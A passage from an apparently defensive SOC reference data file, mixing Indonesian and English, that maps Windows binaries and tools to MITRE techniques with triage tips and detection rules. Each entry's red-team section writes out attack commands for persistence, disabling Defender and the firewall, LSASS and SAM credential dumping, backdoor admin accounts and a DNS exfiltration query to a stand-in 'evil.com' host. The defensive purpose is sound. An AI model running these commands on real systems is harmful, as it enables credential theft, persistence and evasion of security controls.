    detect:"Alert esentutl.exe /y + ntds.dit/SAM source. Monitor URL params.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Esentutl/"] },

  { n:"control.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\control.exe",
    d:"Windows Control Panel", r:"MEDIUM",
    m:["T1218.002"], mn:["Signed Binary Proxy Execution: Control Panel"], t:["Defense Evasion","Execution"],
    tldr:".cpl file itu basically DLL dengan ekstensi diganti. Kalau control.exe load CPL yang bukan dari System32, suspicious. Gak terlalu sering muncul di modern attacks, tapi tetap perlu dicek kalau ada.",
    abuse:"Load malicious CPL files (DLLs renamed .cpl). Exec arbitrary code.",
    red:{
      desc:"Load malicious CPL (Control Panel item = renamed DLL) untuk exec code via trusted Windows binary.",
      cmds:[
        {c:"control.exe C:\\Temp\\evil.cpl", n:"load CPL dari path non-standard — CPL adalah DLL yang rename extensinya"},
        {c:"control.exe C:\\Users\\Public\\payload.cpl", n:"common drop path — CPL attachment dari phishing"},
        {c:"rundll32.exe shell32.dll,Control_RunDLL C:\\Temp\\evil.cpl", n:"alternative cara load CPL via rundll32"},
      ]
    },
    legit:"Opening control panel items. Custom .cpl = suspicious.",
    tips:["Cek CPL file — path + origin","Cek CPL dari temp/downloads","Cek parent process","Cek child procs + network"],
    detect:"Alert control.exe loading CPL dari non-System32.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Control/","https://attack.mitre.org/techniques/T1218/002/"] },

  { n:"pcalua.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\pcalua.exe",
    d:"Program Compatibility Assistant", r:"MEDIUM",
    m:["T1202"], mn:["Indirect Command Execution"], t:["Defense Evasion"],
    tldr:"Proxy exec yang cukup jarang dipakai tapi ada di toolkit. Normalnya auto-triggered sistem, bukan manual. Manual invocation dengan -a flag yang exec binary suspicious = worth investigating.",
    abuse:"Proxy execution via -a flag. Bypass application whitelisting.",
    red:{
      desc:"Indirect execution — spawn arbitrary binary dengan pcalua sebagai parent, bypass beberapa whitelist rules.",
      cmds:[
        {c:"pcalua.exe -a C:\\Temp\\malware.exe", n:"-a = application path — pcalua jadi parent, masking direct execution"},
        {c:"pcalua.exe -a C:\\Windows\\System32\\cmd.exe -c \"powershell -enc BASE64\"", n:"spawn cmd dengan arguments via pcalua — double indirect"},
      ]
    },
    legit:"Compat assistant auto-triggered. Manual -a = suspicious.",
    tips:["Cek -a flag — apa yang diexec?","Cek parent process","Cek manual invocation"],
    detect:"Alert pcalua.exe -a execution.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Pcalua/"] },

  { n:"gpscript.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\gpscript.exe",
    d:"Group Policy script processing", r:"MEDIUM",
    m:["T1218"], mn:["Signed Binary Proxy Execution"], t:["Defense Evasion","Execution"],
    tldr:"Jarang banget muncul. Harusnya auto-triggered sistem saat logon/startup, bukan manual. Kalau ada manual invocation, hampir pasti suspicious — cek GPO script apa yang dieksekusi.",
    abuse:"Trigger GPO logon/startup scripts. Compromised GPO = malicious script exec.",
    red:{
      desc:"Force execution GPO-registered scripts — jika attacker bisa modify GPO, bisa trigger script exec.",
      cmds:[
        {c:"gpscript.exe /logon", n:"force exec semua logon scripts dari GPO — jika GPO sudah dikompromis"},
        {c:"gpscript.exe /startup", n:"force exec startup scripts — biasanya butuh elevated privileges"},
      ]
    },
    legit:"GPO processing saat logon/startup. Manual invocation = suspicious.",
    tips:["Cek GPO script expected?","Cek script yang dieksekusi","Cek unauthorized GPO mods","Cek timing — boot vs manual"],
    detect:"Alert manual gpscript.exe invocation.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Gpscript/"] },

  // ┌──────────────────────────────────────────────┐
  // │         WINDOWS — SYSTEM BINARIES             │
  // └──────────────────────────────────────────────┘
  { n:"schtasks.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\schtasks.exe",
    d:"Schedule tasks", r:"HIGH",
    m:["T1053.005"], mn:["Scheduled Task"], t:["Execution","Persistence","Privilege Escalation"],
    tldr:"Persistence classic — task yang run payload saat logon/boot/interval. Fokus ke /tn (nama task, biasanya camouflage jadi legit), /tr (apa yang dirun), dan /ru (run as siapa). Task run SYSTEM + binary dari temp = red flag. Check Event ID 4698.",
    abuse:"Create scheduled tasks untuk persistence/privesc. Task run payload berkala atau saat boot.",
    red:{
      desc:"Persistence via scheduled task, run SYSTEM-level payload, lateral movement via remote task creation.",
      cmds:[
        {c:"schtasks.exe /create /tn \"WindowsUpdateCheck\" /tr \"C:\\Temp\\beacon.exe\" /sc onlogon /ru SYSTEM /f", n:"persistence — run payload sebagai SYSTEM saat logon, /f=force overwrite"},
        {c:"schtasks.exe /create /tn \"MicrosoftEdgeUpdate\" /tr \"powershell -ep bypass -w hidden -enc BASE64\" /sc minute /mo 5 /f", n:"periodic execution — setiap 5 menit, nama task camouflage sebagai legit"},
        {c:"schtasks.exe /create /s 192.168.1.10 /u DOMAIN\\admin /p Pass123 /tn \"Evil\" /tr \"cmd /c C:\\Temp\\b.exe\" /sc once /st 00:00 /f", n:"remote task creation — lateral movement ke host lain via scheduled task"},
        {c:"schtasks.exe /run /tn \"WindowsUpdateCheck\"", n:"langsung trigger task yang sudah dibuat — tidak perlu tunggu schedule"},
      ]
    },
    legit:"IT admin, deployment. Cek CONTEXT — siapa buat + apa yang dijalankan.",
    tips:["Cek /create — task baru?","Cek /tn (name) + /tr (run) — apa dijalankan?","Cek /sc (schedule) — ONLOGON, ONSTART, MINUTE?","Cek /ru — run as SYSTEM?","Cek /s flag — remote machine?","Cek parent process","Cek task XML di System32\\Tasks\\"],
    detect:"Monitor schtasks /create. Alert tasks run SYSTEM + binary dari unusual paths. Event ID 4698.",
    ref:["https://attack.mitre.org/techniques/T1053/005/"] },

  { n:"sc.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\sc.exe",
    d:"Service Control Manager", r:"HIGH",
    m:["T1543.003","T1569.002"], mn:["Windows Service","Service Execution"], t:["Persistence","Privilege Escalation","Execution"],
    tldr:"Service manager — sc create = service baru = persistence. Langsung cek binpath ke mana. sc config = modify service yang sudah ada = hijack. Kalau ada /s flag itu ke remote host = lateral movement. Event ID 7045 untuk service installation.",
    abuse:"Create malicious services, modify binpath. Persistence + privesc.",
    red:{
      desc:"Create backdoor service, modify existing service binpath, remote service untuk lateral movement.",
      cmds:[
        {c:"sc.exe create EvilSvc binpath= \"C:\\Temp\\beacon.exe\" start= auto", n:"create service baru — auto start = persistent setelah reboot"},
        {c:"sc.exe create EvilSvc binpath= \"cmd /c C:\\Temp\\beacon.exe\" start= auto type= own", n:"service via cmd — bisa inject command chain"},
        {c:"sc.exe config legitsvc binpath= \"C:\\Temp\\beacon.exe\"", n:"hijack existing service — ganti binary path layanan yang sudah ada"},
        {c:"sc.exe \\\\192.168.1.10 create backdoor binpath= \"cmd /c whoami > C:\\Temp\\out.txt\" start= demand", n:"create remote service — lateral movement, butuh admin share access"},
        {c:"sc.exe start EvilSvc", n:"start service yang sudah dibuat — exec payload"},
      ]
    },
    legit:"Service management. sc create dari user biasa = very suspicious.",
    tips:["Cek sub-command — create, config, start, query, delete?","Cek binpath — suspicious executable?","Cek service name — newly created?","Cek /s flag — remote?","Cek start type — auto?","Cek run-as — LocalSystem?"],
    detect:"Alert sc create + sc config binpath=. Event ID 7045.",
    ref:["https://attack.mitre.org/techniques/T1543/003/"] },

  { n:"reg.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\reg.exe",
    d:"Registry editor CLI", r:"MEDIUM",
    m:["T1112","T1547.001"], mn:["Modify Registry","Registry Run Keys"], t:["Defense Evasion","Persistence"],
    tldr:"Registry CLI — dua hal yang langsung bikin alert: reg ADD ke Run/RunOnce keys (persistence), dan reg SAVE ke SAM/SYSTEM (itu prep credential dump, anggap credential theft in progress). Cek key yang diakses, bukan cuma command-nya.",
    abuse:"Persistence Run keys, disable security, export SAM/SYSTEM hives.",
    red:{
      desc:"Add persistence via Run keys, disable security controls, dump SAM/SYSTEM hive untuk offline credential cracking.",
      cmds:[
        {c:"reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\Temp\\beacon.exe\" /f", n:"user-level Run key persistence — tidak butuh admin, execute saat user logon"},
        {c:"reg.exe add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\Temp\\beacon.exe\" /f", n:"system-level Run key — butuh admin, execute untuk semua user"},
        {c:"reg.exe save HKLM\\SAM C:\\Temp\\sam.hive && reg.exe save HKLM\\SYSTEM C:\\Temp\\system.hive", n:"dump SAM+SYSTEM hive — bisa extract NTLM hashes offline dengan impacket/secretsdump"},
        {c:"reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\LSA\" /v \"RunAsPPL\" /t REG_DWORD /d 0 /f", n:"disable LSA Protection — memudahkan LSASS dump"},
        {c:"reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", n:"disable Windows Defender via registry"},
      ]
    },
    legit:"Sysadmin, config. Cek KEY yang diakses.",
    tips:["Cek command — ADD, QUERY, EXPORT, SAVE, DELETE?","Cek registry key — Run keys? Security?","Cek value — points to suspicious exe?","Cek SAVE/EXPORT SAM/SYSTEM/SECURITY","Cek parent process"],
    detect:"Monitor reg ADD ke Run/RunOnce. Alert SAVE/EXPORT SAM/SYSTEM/SECURITY.",
    ref:["https://attack.mitre.org/techniques/T1112/"] },

  { n:"netsh.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\netsh.exe",
    d:"Network configuration CLI", r:"MEDIUM",
    m:["T1090.001","T1049"], mn:["Internal Proxy","System Network Connections Discovery"], t:["Command and Control","Discovery"],
    tldr:"Multi-purpose network tool — portproxy = port forwarding untuk C2, firewall off = defense evasion, wlan key=clear = WiFi password dump. Tiap sub-command punya konteks beda, tapi semua suspicious di luar admin context. Cek apa yang di-modify.",
    abuse:"Port forwarding/proxy, disable firewall, capture traffic, helper DLL persistence.",
    red:{
      desc:"Port proxy untuk redirect traffic C2, disable firewall, extract saved WiFi passwords, DLL helper untuk persistence.",
      cmds:[
        {c:"netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.10", n:"port forwarding — redirect traffic lokal port 8080 ke C2 di 10.10.10.10:80"},
        {c:"netsh.exe advfirewall set allprofiles state off", n:"disable Windows Firewall — semua profile (domain/private/public)"},
        {c:"netsh.exe advfirewall firewall add rule name=\"Allow C2\" dir=in action=allow protocol=tcp localport=4444", n:"buka port firewall untuk reverse shell listener"},
        {c:"netsh.exe wlan show profiles key=clear", n:"dump saved WiFi passwords plaintext — credential harvesting"},
        {c:"netsh.exe add helper C:\\Temp\\evil.dll", n:"add helper DLL — persistence via netsh, DLL load setiap netsh dipanggil"},
      ]
    },
    legit:"Network admin. portproxy + add helper JARANG legitimate.",
    tips:["Cek command — portproxy, firewall, wlan, add helper?","Cek port forwarding rules","Cek firewall disabled/added","Cek helper DLL","Cek parent process"],
    detect:"Alert netsh portproxy/firewall set/add helper.",
    ref:["https://attack.mitre.org/techniques/T1090/001/"] },

  { n:"net.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\net.exe",
    d:"Network resource management", r:"MEDIUM",
    m:["T1087.001","T1135"], mn:["Account Discovery","Network Share Discovery"], t:["Discovery","Lateral Movement"],
    tldr:"\"net user /add\" + \"net localgroup administrators /add\" dalam satu chain = pattern ransomware pre-deployment yang sangat common. Rapid multiple net commands dalam waktu singkat = automated recon. Sendiri sih lumayan normal, tapi dalam konteks incident langsung fokus ke kombinasi command-nya.",
    abuse:"Recon — enumerate users, groups, shares, sessions. Add users, map drives.",
    red:{
      desc:"Post-exploit recon standar dan backdoor user creation. Rapid net commands dalam waktu singkat = automated recon.",
      cmds:[
        {c:"net.exe user backdoor P@ssw0rd123! /add && net.exe localgroup administrators backdoor /add", n:"buat user backdoor + tambah ke local admins — sering pattern ransomware pre-deployment"},
        {c:"net.exe user /domain", n:"enum semua domain users — recon AD"},
        {c:"net.exe localgroup administrators", n:"lihat siapa admin lokal — identifikasi high-value targets"},
        {c:"net.exe view /domain", n:"enum semua komputer di domain — pre-lateral movement recon"},
        {c:"net.exe use \\\\192.168.1.10\\C$ /user:DOMAIN\\admin Pass123", n:"mount C$ admin share — precursor untuk copy tools ke remote host"},
        {c:"net.exe session", n:"lihat active SMB sessions ke host ini — siapa connect"},
      ]
    },
    legit:"IT admin. Rapid net commands = suspicious recon.",
    tips:["Cek sub-command — user, localgroup, share, view, session, use?","Cek net user /add","Cek rapid enum commands (recon)","Cek parent process","Cek net use ke unusual shares"],
    detect:"Monitor rapid net.exe. Alert net user /add + net localgroup administrators /add.",
    ref:["https://attack.mitre.org/techniques/T1087.001/"] },

  { n:"nltest.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\nltest.exe",
    d:"Network logon test tool", r:"MEDIUM",
    m:["T1482"], mn:["Domain Trust Discovery"], t:["Discovery"],
    tldr:"Domain trust enum — biasanya dilakukan awal post-compromise untuk map attack paths ke domain lain. Non-admin user pakai ini = very suspicious. Domain admin pakai ini di production = butuh justifikasi.",
    abuse:"Enumerate domain trusts, DCs. Map AD attack paths.",
    red:{
      desc:"Domain trust enumeration — identifikasi trusted domains untuk lateral movement / privilege escalation path.",
      cmds:[
        {c:"nltest.exe /domain_trusts", n:"list semua domain trusts — map attack paths ke trusted domains lain"},
        {c:"nltest.exe /dclist:corp.local", n:"enum semua Domain Controllers di domain — prioritize target untuk DCSync/Kerberoast"},
        {c:"nltest.exe /trusted_domains", n:"list trusted domains dari perspective host ini"},
        {c:"nltest.exe /sc_query:corp.local", n:"query secure channel status ke DC — verify connectivity"},
      ]
    },
    legit:"Domain admin. Non-admin user = very suspicious.",
    tips:["Cek /dclist, /trusted_domains, /domain_trusts","Cek user context — admin?","Cek concurrent recon tools","Korelasi timeline"],
    detect:"Alert nltest oleh non-admin. Monitor /domain_trusts + /dclist.",
    ref:["https://attack.mitre.org/techniques/T1482/"] },

  { n:"tasklist.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\tasklist.exe",
    d:"List running processes", r:"LOW",
    m:["T1057"], mn:["Process Discovery"], t:["Discovery"],
    tldr:"Sendiri sangat common dan hampir gak pernah jadi concern. Jadi perhatiin kalau muncul bareng command recon lain (net, nltest, systeminfo) dalam waktu singkat — itu automated post-exploit recon chain. Attacker biasanya pakai ini untuk cek AV/EDR sebelum deploy payload.",
    abuse:"Recon — enumerate processes, identify security tools.",
    red:{
      desc:"Enum proses untuk identifikasi AV/EDR yang berjalan sebelum deploy payload, verifikasi payload exec.",
      cmds:[
        {c:"tasklist.exe /v", n:"verbose — lihat semua proses + username + window title"},
        {c:"tasklist.exe /svc", n:"lihat services per process — identify security services"},
        {c:"tasklist.exe /s 192.168.1.10 /u DOMAIN\\admin /p Pass123", n:"remote process list — pre-lateral movement recon"},
        {c:"tasklist.exe | findstr /i \"defender antivirus edr sysmon\"", n:"cek apakah security tools berjalan sebelum deploy payload"},
      ]
    },
    legit:"Common troubleshoot. Suspicious dalam recon chain.",
    tips:["Cek rapid tasklist (recon)","Cek parent process","Korelasi recon chain (net,nltest,systeminfo)","Cek /s — remote?"],
    detect:"Monitor tasklist dalam recon chain.",
    ref:["https://attack.mitre.org/techniques/T1057/"] },

  { n:"whoami.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\whoami.exe",
    d:"Display current user info", r:"LOW",
    m:["T1033"], mn:["System Owner/User Discovery"], t:["Discovery"],
    tldr:"Post-exploit check standar — \"saya siapa dan privilege apa yang gue punya.\" Sangat common dan gak suspicious sendiri. Yang worth noted: /priv /all flags dalam recon chain, terutama kalau setelah ada lateral movement atau exploit.",
    abuse:"Basic recon — user context, privileges, groups.",
    red:{
      desc:"Cek user context post-exploit — apakah SYSTEM/admin, privileges apa yang tersedia untuk next step.",
      cmds:[
        {c:"whoami.exe /all", n:"full output — username + SID + groups + privileges sekaligus"},
        {c:"whoami.exe /priv", n:"check privileges — cari SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege"},
        {c:"whoami.exe /groups", n:"check group membership — apakah domain admin, backup operator, dll"},
        {c:"whoami.exe /fqdn", n:"fully qualified domain name — confirm domain membership"},
      ]
    },
    legit:"Common admin. Suspicious in recon chain.",
    tips:["Cek /priv, /groups, /all","Cek parent process","Korelasi recon tools","Cek automated script"],
    detect:"Monitor whoami /priv + /all dalam recon chain.",
    ref:["https://attack.mitre.org/techniques/T1033/"] },

  { n:"systeminfo.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\systeminfo.exe",
    d:"System configuration info", r:"LOW",
    m:["T1082"], mn:["System Information Discovery"], t:["Discovery"],
    tldr:"OS fingerprint + patch level — sendiri gak alarming sama sekali. Concern-nya kalau muncul rapid bareng net, nltest, whoami = automated post-exploit recon. Attacker pakai ini untuk cari missing patches yang bisa di-exploit.",
    abuse:"Recon — OS, patches, network. Identify vulns.",
    red:{
      desc:"Fingerprint OS + patch level untuk identifikasi exploitable vulnerabilities.",
      cmds:[
        {c:"systeminfo.exe", n:"full system info — OS, hotfixes, network adapters, domain — identify missing patches"},
        {c:"systeminfo.exe | findstr /i \"hotfix kb\"", n:"extract patch list — cari missing critical patches"},
        {c:"systeminfo.exe /s 192.168.1.10 /u DOMAIN\\admin /p Pass123", n:"remote system info — pre-lateral movement recon"},
        {c:"systeminfo.exe /fo csv > C:\\Temp\\sysinfo.csv", n:"output ke CSV — staged untuk exfil"},
      ]
    },
    legit:"Common troubleshoot. Suspicious in recon chain.",
    tips:["Cek parent process","Korelasi recon chain","Cek output piped"],
    detect:"Monitor systeminfo dalam recon chain.",
    ref:["https://attack.mitre.org/techniques/T1082/"] },

  { n:"ipconfig.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\ipconfig.exe",
    d:"Display IP configuration", r:"LOW",
    m:["T1016"], mn:["System Network Config Discovery"], t:["Discovery"],
    tldr:"Sangat basic dan sangat common — hampir tidak pernah jadi concern sendiri. Cuma worth noted kalau dalam recon chain setelah compromise. /all flag berguna untuk dapet subnet + DNS info untuk pivot planning.",
    abuse:"Basic network recon.",
    red:{
      desc:"Network config discovery — identifikasi subnets, DNS servers, gateway untuk pivot planning.",
      cmds:[
        {c:"ipconfig.exe /all", n:"full network config — IP, MAC, DNS, DHCP server, gateway — map network topology"},
        {c:"ipconfig.exe /all | findstr /i \"dns subnet gateway\"", n:"extract network config untuk pivot planning"},
      ]
    },
    legit:"Common admin. Suspicious in chain only.",
    tips:["Cek /all","Cek parent","Korelasi recon chain"],
    detect:"Monitor dalam recon chain.",
    ref:["https://attack.mitre.org/techniques/T1016/"] },

  { n:"nslookup.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\nslookup.exe",
    d:"DNS query tool", r:"LOW",
    m:["T1016.001"], mn:["Internet Connection Discovery"], t:["Discovery"],
    tldr:"DNS query tool yang sangat common. Concern spesifik: TXT queries ke external domain yang aneh (DNS tunneling pattern), atau rapid queries ke banyak domain = automated. Sendiri hampir gak pernah alarming.",
    abuse:"DNS enum, DNS exfil channels.",
    red:{
      desc:"DNS recon dan verifikasi DNS tunneling channel.",
      cmds:[
        {c:"nslookup.exe -type=TXT data.exfil.evil.com 8.8.8.8", n:"TXT record query ke external DNS — possible DNS tunneling atau exfil via DNS"},
        {c:"nslookup.exe corp.local", n:"resolve domain — confirm network connectivity + DNS server"},
        {c:"nslookup.exe -type=MX corp.local", n:"enum mail servers — recon untuk phishing / pivot"},
        {c:"nslookup.exe -type=SRV _kerberos._tcp.corp.local", n:"find DCs via Kerberos SRV record — AD recon"},
      ]
    },
    legit:"DNS troubleshoot. Check query.",
    tips:["Cek domain — suspicious?","Cek TXT records (DNS tunneling)","Cek rapid queries = automated"],
    detect:"Monitor unusual DNS via nslookup. TXT ke external.",
    ref:["https://attack.mitre.org/techniques/T1016/001/"] },

  { n:"at.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\at.exe",
    d:"Legacy task scheduler (DEPRECATED)", r:"MEDIUM",
    m:["T1053.002"], mn:["Scheduled Task/Job: At"], t:["Execution","Persistence"],
    tldr:"DEPRECATED legacy scheduler — harusnya gak ada dalam workflow normal enterprise modern. Any manual invocation = suspicious by default, gak perlu banyak context lagi. Kalau ada remote target, itu lateral movement.",
    abuse:"Legacy scheduled tasks. DEPRECATED — any usage suspicious.",
    red:{
      desc:"Legacy scheduler — DEPRECATED tapi masih jalan di banyak Windows. Dipakai attacker karena less monitored.",
      cmds:[
        {c:"at.exe 14:30 \"cmd /c C:\\Temp\\beacon.exe\"", n:"schedule one-time exec — less monitored dari schtasks"},
        {c:"at.exe \\\\192.168.1.10 14:30 \"cmd /c C:\\Temp\\beacon.exe\"", n:"remote at scheduling — lateral movement, butuh admin rights ke remote"},
      ]
    },
    legit:"DEPRECATED. Any usage = suspicious.",
    tips:["Cek scheduled command","Cek timing","Cek remote target","Cek user context"],
    detect:"Alert ANY at.exe usage.",
    ref:["https://attack.mitre.org/techniques/T1053/002/"] },

  // ┌──────────────────────────────────────────────┐
  // │       WINDOWS — CRITICAL PROCESSES            │
  // └──────────────────────────────────────────────┘
  { n:"svchost.exe", c:"critical", os:"win", p:"C:\\Windows\\System32\\svchost.exe",
    d:"Service Host process", r:"HIGH",
    m:["T1055","T1036.005"], mn:["Process Injection","Masquerading"], t:["Defense Evasion"],
    tldr:"Core process yang jalan ratusan instance — dan itu normal. Dua hal yang gak normal: path bukan System32, atau parent bukan services.exe. Kalau salah satu itu terjadi = malware masquerading, no exception. Cek path dulu, itu yang paling cepet.",
    abuse:"Malware masquerade/inject. WRONG PATH = MALWARE.",
    red:{
      desc:"Target untuk process injection atau masquerade — attacker drop malware dengan nama svchost.exe di path salah.",
      cmds:[
        {c:"C:\\Users\\Public\\svchost.exe -k netsvcs", n:"MALWARE — path bukan System32. Masquerade sebagai svchost."},
        {c:"C:\\Windows\\Temp\\svchost.exe", n:"MALWARE — common drop location. Perhatikan path di XDR."},
        {c:"C:\\ProgramData\\svchost.exe -k malwaresvcs", n:"MALWARE — masquerade pattern dengan fake -k argument"},
      ]
    },
    legit:"Core Windows. Multiple instances normal. Validate PATH + PARENT.",
    tips:["CRITICAL: Path HARUS C:\\Windows\\System32\\svchost.exe","Parent HARUS services.exe","Cek -k parameter (service group)","Path bukan System32 = MALWARE","Parent bukan services.exe = SUSPICIOUS","Cek network connections cocok service"],
    detect:"Alert svchost dari non-System32. Alert parent bukan services.exe.",
    ref:["https://attack.mitre.org/techniques/T1036/005/"] },

  { n:"lsass.exe", c:"critical", os:"win", p:"C:\\Windows\\System32\\lsass.exe",
    d:"Local Security Authority Subsystem", r:"CRITICAL",
    m:["T1003.001"], mn:["OS Credential Dumping: LSASS Memory"], t:["Credential Access"],
    tldr:"Ini yang nyimpen semua credentials Windows. ANY unusual process access ke lsass = investigate immediately, tidak ada gray area. Primary target semua credential dumping tools — procdump, mimikatz, comsvcs.dll, semua targetnya lsass ini.",
    abuse:"PRIMARY target credential dumping. Plaintext passwords, hashes, Kerberos tickets. ANY access = investigate.",
    red:{
      desc:"Target untuk memory dump — berbagai tools/teknik untuk extract credentials dari LSASS process.",
      cmds:[
        {c:"procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp", n:"dump LSASS memory dengan Sysinternals procdump — paling common"},
        {c:"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full", n:"native Windows LSASS dump tanpa upload tool — ganti 624 dengan PID lsass aktual"},
        {c:"tasklist /fi \"imagename eq lsass.exe\"", n:"get PID lsass untuk dipakai di command MiniDump di atas"},
        {c:"C:\\Temp\\mimikatz.exe \"sekurlsa::minidump C:\\Temp\\lsass.dmp\" \"sekurlsa::logonpasswords\" exit", n:"parse dump offline — extract credentials dari file lsass.dmp"},
      ]
    },
    legit:"Core Windows. ONE instance. ANY unusual access = INVESTIGATE.",
    tips:["Path HARUS C:\\Windows\\System32\\lsass.exe (1 instance)","Cek process access (Event ID 10)","Cek memory dump files","Parent HARUS wininit.exe","Multiple lsass = MALWARE masquerading","Cek Credential Guard/LSA Protection"],
    detect:"Enable LSA Protection. Alert ANY process accessing lsass. Event ID 10.",
    ref:["https://attack.mitre.org/techniques/T1003/001/"] },

  { n:"explorer.exe", c:"critical", os:"win", p:"C:\\Windows\\explorer.exe",
    d:"Windows Explorer shell", r:"LOW",
    m:["T1055"], mn:["Process Injection"], t:["Defense Evasion"],
    tldr:"Shell yang selalu jalan jadi target injection untuk hide di dalamnya. Sendiri gak suspicious — monitor unusual network activity dan loaded DLLs yang aneh. Multiple instances per session itu juga perlu dicek.",
    abuse:"Process injection target — always running.",
    red:{
      desc:"Target process injection — selalu running sehingga ideal untuk inject shellcode dan blend in.",
      cmds:[
        {c:"# Process injection via PowerShell:\n$explorer = Get-Process explorer\n$handle = OpenProcess(0x1F0FFF, $false, $explorer.Id)", n:"PowerShell OpenProcess ke explorer — precursor injection, cek di ScriptBlock logs"},
        {c:"C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding", n:"COM elevation via explorer — UAC bypass technique"},
      ]
    },
    legit:"Core shell. 1 per session.",
    tips:["Cek multiple instances","Cek unusual loaded DLLs","Cek network connections (rare legit)","Cek unusual child processes"],
    detect:"Monitor explorer network. Alert multiple instances.",
    ref:["https://attack.mitre.org/techniques/T1055/"] },

  { n:"csrss.exe", c:"critical", os:"win", p:"C:\\Windows\\System32\\csrss.exe",
    d:"Client/Server Runtime Subsystem", r:"HIGH",
    m:["T1036.005"], mn:["Masquerading"], t:["Defense Evasion"],
    tldr:"Core process — masquerade target favorit malware. Aturannya simple: harus dari System32, parent harus smss.exe. Beda dari itu = malware, no exception, langsung escalate.",
    abuse:"Malware masquerade. Wrong path = malware.",
    red:{
      desc:"Masquerade target — malware sering pakai nama csrss.exe dengan path yang salah.",
      cmds:[
        {c:"C:\\Temp\\csrss.exe", n:"MALWARE — path bukan System32/SysWOW64"},
        {c:"C:\\Users\\Public\\csrss.exe", n:"MALWARE — user-writable path"},
      ]
    },
    legit:"Core OS. System32. Parent smss.exe.",
    tips:["Path HARUS System32","Parent HARUS smss.exe","Wrong path = MALWARE","Cek loaded DLLs"],
    detect:"Alert csrss non-System32. Alert wrong parent.",
    ref:["https://attack.mitre.org/techniques/T1036/005/"] },

  { n:"winlogon.exe", c:"critical", os:"win", p:"C:\\Windows\\System32\\winlogon.exe",
    d:"Windows Logon Process", r:"HIGH",
    m:["T1547.004"], mn:["Winlogon Helper DLL"], t:["Persistence"],
    tldr:"Handles logon — bahayanya bukan di binary-nya tapi di registry keys-nya. Userinit dan Shell value di Winlogon key bisa dimodif untuk load backdoor saat setiap user logon. Monitor registry changes ke key itu.",
    abuse:"Registry Winlogon\\Shell/Userinit modify untuk persistence.",
    red:{
      desc:"Modifikasi registry Winlogon key untuk load malicious DLL/executable saat user login.",
      cmds:[
        {c:"reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Temp\\backdoor.exe\" /f", n:"tambahkan backdoor ke Userinit — dieksekusi saat setiap user logon"},
        {c:"reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe,C:\\Temp\\backdoor.exe\" /f", n:"tambahkan ke Shell value — alternatif persistence via Winlogon"},
      ]
    },
    legit:"Core OS. Check registry mods.",
    tips:["Cek HKLM\\...\\Winlogon\\Shell","Cek ...\\Userinit value","Path HARUS System32","Parent HARUS smss.exe"],
    detect:"Monitor Winlogon Shell/Userinit registry changes.",
    ref:["https://attack.mitre.org/techniques/T1547/004/"] },

  { n:"services.exe", c:"critical", os:"win", p:"C:\\Windows\\System32\\services.exe",
    d:"Service Control Manager", r:"HIGH",
    m:["T1036.005"], mn:["Masquerading"], t:["Defense Evasion"],
    tldr:"ONE instance, dari System32, parent wininit.exe — itu aturannya. Lebih dari satu instance atau path salah = malware masquerading. Sama kayak svchost, cek path dulu, itu paling cepet.",
    abuse:"Malware masquerade. ONE instance only.",
    red:{
      desc:"Masquerade target — malware pakai nama services.exe untuk blend in. Selalu cek path dan parent.",
      cmds:[
        {c:"C:\\Windows\\Temp\\services.exe", n:"MALWARE — bukan dari System32"},
        {c:"C:\\ProgramData\\services.exe", n:"MALWARE — common masquerade location"},
      ]
    },
    legit:"Core OS. ONE instance. Parent wininit.exe.",
    tips:["SATU instance only","Parent HARUS wininit.exe","Path HARUS System32","Multiple = MALWARE"],
    detect:"Alert multiple services.exe or wrong path/parent.",
    ref:["https://attack.mitre.org/techniques/T1036/005/"] },

  // ┌──────────────────────────────────────────────┐
  // │            OFFENSIVE TOOLS                    │
  // └──────────────────────────────────────────────┘
  { n:"mimikatz.exe", c:"offensive", os:"win", p:"N/A (bukan system binary)",
    d:"Credential extraction tool", r:"CRITICAL",
    m:["T1003.001","T1558.003"], mn:["LSASS Memory","Kerberoasting"], t:["Credential Access"],
    tldr:"Kalau ada evidence ini jalan, itu bukan alert lagi — itu INCIDENT. Binary sering di-rename tapi behavior tetap sama. Cek lateral movement post-execution karena itu hampir pasti sudah terjadi. Assume credential compromise.",
    chain:{ stage:"Credential Access → Lateral Movement", flows:["lsass.exe access → mimikatz.exe → pass-the-hash → psexec.exe","mimikatz.exe sekurlsa::logonpasswords → domain accounts compromised","mimikatz.exe lsadump::dcsync → all AD hashes → persistence"] },
